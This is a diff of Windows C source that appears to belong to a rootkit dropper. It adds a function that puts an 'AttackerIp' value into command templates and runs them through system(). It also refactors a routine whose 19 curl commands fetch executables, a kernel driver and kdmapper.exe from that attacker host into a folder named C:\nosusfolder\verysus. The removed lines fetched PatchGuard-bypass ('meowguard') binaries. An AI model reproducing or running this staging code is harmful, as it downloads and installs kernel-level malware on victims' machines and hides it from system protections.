@@ -136,45 +136,101 @@ int GetPidByName(const char* Name) {
 }
 
 
+int CheckLetterInArr(char Chr, const char* Arr) {
+    for (int i = 0; i < strlen(Arr); i++) {
+        if (Arr[i] == Chr) {
+            return i;
+        }
+    }
+    return -1;
+}
+
+
+BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
+    int ActualSize = 1;
+    int CurrRepIndex = 0;
+    int ActualCommandIndex = 0;
+    int SystemReturn = -1;
+
+    for (int ci = 0; ci < CommandCount; ci++) {
+        ActualSize += strlen(CommandArr[ci]);
+        for (int si = 0; si < SymbolCount; si++) {
+            ActualSize -= CountOccurrences(CommandArr[ci], Symbols[si]);
+            for (int r = 0; r < CountOccurrences(CommandArr[ci], Symbols[si]); r++) {
+                ActualSize += strlen(Replacements[si]);
+            }
+        }
+    }
+
+    char* ActualCommand = (char*)malloc(ActualSize);
+    if (ActualCommand == NULL) {
+        printf("malloc failed - %d\n", GetLastError());
+        return FALSE;
+    }
+
+    for (int ci = 0; ci < CommandCount; ci++) {
+        for (int cii = 0; cii < strlen(CommandArr[ci]); cii++) {
+            CurrRepIndex = CheckLetterInArr(CommandArr[ci][cii], Symbols);
+            if (CurrRepIndex == -1) {
+                ActualCommand[ActualCommandIndex] = CommandArr[ci][cii];
+                ActualCommandIndex++;
+            }
+            else {
+                for (int ri = 0; ri < strlen(Replacements[CurrRepIndex]); ri++) {
+                    ActualCommand[ActualCommandIndex] = Replacements[CurrRepIndex][ri];
+                    ActualCommandIndex++;
+                }
+            }
+        }
+    }
+    ActualCommand[ActualCommandIndex] = '\0';
+    printf("Performed command: %s\n", ActualCommand);
+    SystemReturn = system(ActualCommand);
+    if (SystemReturn == -1) {
+        free(ActualCommand);
+        printf("Performed command returned -1 (error) - %d\n", GetLastError());
+        return FALSE;
+    }
+    free(ActualCommand);
+    printf("Performed command returned >= 0 (%d)\n", SystemReturn);
+    return TRUE;
+}
+
+
 int VerfifyDepDirs() {
     if (system("if not exist C:\\nosusfolder\\verysus\\KMDFdriver\\Release mkdir C:\\nosusfolder\\verysus\\KMDFdriver\\Release"
-        "if not exist C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release mkdir C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release"
-        "if not exist mkdir C:\\nosusfolder\\verysus\\AutoService mkdir mkdir C:\\nosusfolder\\verysus\\AutoService"
-        "if not exist mkdir C:\\nosusfolder\\verysus\\meowguard mkdir mkdir C:\\nosusfolder\\verysus\\meowguard") == -1) {
+        "if not exist C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release mkdir C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release") == -1) {
         return GetLastError();
     }
     return 0;
 }
 
 
-int VerfifyDepFiles() {
-    if (system("cd C:\\ && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.sln curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\medium.cpp curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\medium.h curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.cpp curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.h curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\internet.cpp curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\internet.h curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.cpp curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.h curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user && "
-        "if not exist nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe && "
-        "if not exist nosusfolder\\verysus\\AutoService\\AutoStart.exe curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoService\\AutoStart.exe && "
-        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys && "
-        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf && "
-        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb && "
-        "if not exist nosusfolder\\verysus\\kdmapper.exe curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe && "
-        "if not exist nosusfolder\\verysus\\meowguard\\meow.sys curl http://~:8080/KPP/meow10/bin_meow_x64/meow.sys --output nosusfolder\\verysus\\meowguard\\meow.sys && "
-        "if not exist nosusfolder\\verysus\\meowguard\\uninstall.bat curl http://~:8080/KPP/meow10/bin_meow_x64/uninstall.bat --output nosusfolder\\verysus\\meowguard\\uninstall.bat && "
-        "if not exist nosusfolder\\verysus\\meowguard\\install.bat curl http://~:8080/KPP/meow10/bin_meow_x64/install.bat --output nosusfolder\\verysus\\meowguard\\install.bat && "
-        "if not exist nosusfolder\\verysus\\meowguard\\dbghelp.dll curl http://~:8080/KPP/meow10/bin_meow_x64/dbghelp.dll --output nosusfolder\\verysus\\meowguard\\dbghelp.dll && "
-        "if not exist nosusfolder\\verysus\\meowguard\\symsrv.dll curl http://~:8080/KPP/meow10/bin_meow_x64/symsrv.dll --output nosusfolder\\verysus\\meowguard\\symsrv.dll && "
-        "if not exist nosusfolder\\verysus\\meowguard\\meow_client.exe curl http://~:8080/KPP/meow10/bin_meow_x64/meow_client.exe --output nosusfolder\\verysus\\meowguard\\meow_client.exe && "
-        "if not exist nosusfolder\\verysus\\meowguard\\MeowWrapper.exe curl http://~:8080/KPP/meow10/bin_meow_x64/MeowWrapper/x64/Release/MeowWrapper.exe --output nosusfolder\\verysus\\meowguard\\MeowWrapper.exe") == -1) {
-        return GetLastError();
+int VerfifyDepFiles(const char* AttackerIp) {
+    const char* FileCommands[] = {"cd C:\\ && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.sln curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\medium.cpp curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\medium.h curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.cpp curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.h curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\internet.cpp curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\internet.h curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.cpp curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.h curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe && ",
+        "if not exist nosusfolder\\verysus\\AutoStart.exe curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe && ",
+        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys && ",
+        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf && ",
+        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb && ",
+        "if not exist nosusfolder\\verysus\\kdmapper.exe curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe" };
+    const char* ReplaceArr[1] = { AttackerIp };
+    const char* SymbolsArr = "~";
+    const int TotalCommands = 19;
+    if (!PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 1)) {
+        return (int)GetLastError();
     }
     return 0;
 }
